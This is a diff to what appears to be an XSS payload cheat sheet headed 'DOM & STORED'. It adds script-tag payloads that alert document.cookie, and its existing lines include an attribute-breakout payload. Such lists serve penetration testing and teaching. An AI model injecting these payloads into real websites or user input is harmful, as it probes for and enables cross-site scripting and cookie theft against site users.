@@ -1,5 +1,8 @@
 ## DOM & STORED
 ```
+<script>alert(document.cookie)</script>
+<script>alert('document.cookie')</script>
+<script>alert("document.cookie")</script>
 <script>alert(document.domain)</script>
 qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ```
